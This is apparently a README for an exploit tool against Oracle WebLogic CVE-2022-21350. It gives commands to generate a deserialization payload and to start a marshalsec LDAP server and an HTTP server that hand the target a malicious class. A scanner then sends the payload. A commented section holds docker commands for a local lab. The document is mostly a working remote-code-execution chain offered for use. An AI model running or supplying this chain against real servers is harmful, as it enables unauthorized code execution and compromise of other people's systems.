# How use
#### 1- generate payload
```bash
java -cp CVE-2022-21350_powerBy_51pwn.jar com._51pwn.CVE_2022_21350.Main "t3://127.0.0.1:7001/" "ldap://docker.for.mac.localhost:1389/UpX34defineClass"
```
#### 2- start ldap server
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://docker.for.mac.localhost:8888/#UpX34defineClass' 1389
```
#### 3- start http server,for send class file
```bash
node httpServer.js
```
#### 4- send payload
```bash
py3 ../WeblogicScan.py --tags 21350 -r -v -u http://127.0.0.1:7001
```

### Where is payload
```bash
cat test.ser
```

### Why out error message
Running the error does not affect the generation of the payload and the effect of the payload
运行报错不影响payload的生成、不影响payload的效果

# How merge jar
```
cd lib3
# split 
py3 ../tools/splitTools.py -s wlfullclient_12.1.3.jar
# merge 
py3 ../tools/splitTools.py -m wlfullclient_12.1.3.jar

```


#### Special thanks
- <a href=https://github.com/lz520520>@lz520520</a>
- <a href=https://github.com/Y4er>@Y4er</a>
<img width=800 src=https://user-images.githubusercontent.com/18223385/192983557-5d9fa372-c47c-4b0e-a23d-026bcf69283a.png>

<!--
docker stop ${dockerId};docker rm ${dockerId}

docker run -d -p 7001:7001 -p 8453:8453 -v $PWD/setDomainEnv.sh:/home/weblogic/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/setDomainEnv.sh hktalent/weblogic:12.2.1.4.0 
dockerId=`docker ps -a|grep "hktalent\/weblogic"|awk '{print $1}'`
docker cp ${dockerId}:/home/weblogic/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/setDomainEnv.sh .
docker cp setDomainEnv.sh ${dockerId}:/home/weblogic/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/setDomainEnv.sh 
docker restart ${dockerId}
docker logs -f ${dockerId}
docker port ${dockerId} 8543
docker exec -it ${dockerId} /bin/bash

docker cp ${dockerId}:/home/weblogic/Oracle/Middleware/Oracle_Home/wlserver/server/lib/wlfullclient_12.1.3.jar .
docker cp ${dockerId}:/home/weblogic/Oracle/Middleware/Oracle_Home/wlserver/server/lib/wljarbuilder.jar .
docker cp ${dockerId}:/home/weblogic/Oracle/Middleware/Oracle_Home/wlserver/server/lib/../../modules/com.bea.core.jarbuilder.jar lib/


cd /home/weblogic/Oracle/Middleware/Oracle_Home/wlserver/server/lib
/jdk1.8.0_151/bin/java -jar wljarbuilder.jar


java -cp CVE-2022-21350_powerBy_51pwn.jar com._51pwn.CVE_2022_21350.Main "t3://127.0.0.1:7001/" "ldap://docker.for.mac.localhost:1389/UpX34defineClass"

cd src/main/java
jar -cvf ../../../CVE-2022-21350_powerBy_51pwn.jar  weblogic/rjvm/RJVMLogLocalizer.properties    
cd -

-->
